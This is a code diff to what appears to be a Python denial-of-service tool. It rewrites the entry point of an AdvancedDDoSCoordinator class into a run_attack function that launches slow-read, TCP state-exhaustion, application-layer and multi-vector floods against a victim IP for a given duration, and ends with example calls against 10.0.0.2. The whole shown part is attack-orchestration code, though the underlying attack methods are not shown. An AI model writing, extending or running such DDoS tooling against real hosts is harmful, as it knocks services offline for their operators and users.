@@ -579,14 +579,50 @@ class AdvancedDDoSCoordinator:
 
 # ---- Run everything ----
 
-def run_all():
-    target = "10.0.0.2"  # Target IP or hostname
+def run_attack(attacker_host, victim_ip, duration, attack_variant="multi_vector"):
+    """
+    Main function to run a specific advanced adversarial attack.
+    attacker_host is not directly used here as IP rotation is handled internally.
+    """
+    logger.info(f"Starting advanced adversarial attack '{attack_variant}' against {victim_ip} for {duration} seconds.")
+    coordinator = AdvancedDDoSCoordinator(victim_ip)
+
+    if attack_variant == "slow_read":
+        coordinator.advanced.slow_read_attack(victim_ip, duration=duration)
+    elif attack_variant == "tcp_state_exhaustion":
+        # For state exhaustion, we might run it in a loop for the duration
+        end_time = time.time() + duration
+        while time.time() < end_time:
+            coordinator.advanced.tcp_state_exhaustion(victim_ip, num_packets=100)
+            time.sleep(1) # Small delay
+    elif attack_variant == "application_layer":
+        end_time = time.time() + duration
+        while time.time() < end_time:
+            coordinator.advanced.distributed_application_layer_attack(victim_ip, num_requests=50)
+            time.sleep(1) # Small delay
+    elif attack_variant == "multi_vector":
+        coordinator.advanced.multi_vector_attack(victim_ip, duration=duration)
+    else:
+        logger.warning(f"Unknown attack variant: {attack_variant}. Running multi_vector by default.")
+        coordinator.advanced.multi_vector_attack(victim_ip, duration=duration)
     
-    # Create coordinator
-    coordinator = AdvancedDDoSCoordinator(target)
-    
-    # Execute advanced attack for 5 minutes
-    coordinator.execute_advanced_attack(duration=300)
+    logger.info(f"Advanced adversarial attack '{attack_variant}' completed.")
 
 if __name__ == "__main__":
-    run_all()
+    # Example usage for standalone testing
+    # You would typically call run_attack from main.py
+    # For testing, let's assume a victim IP and a duration
+    test_victim_ip = "10.0.0.2"
+    test_duration = 60 # seconds
+    
+    # Example: Run a multi-vector attack
+    run_attack(None, test_victim_ip, test_duration, "multi_vector")
+    
+    # Example: Run a slow_read attack
+    # run_attack(None, test_victim_ip, test_duration, "slow_read")
+    
+    # Example: Run a tcp_state_exhaustion attack
+    # run_attack(None, test_victim_ip, test_duration, "tcp_state_exhaustion")
+    
+    # Example: Run an application_layer attack
+    # run_attack(None, test_victim_ip, test_duration, "application_layer")
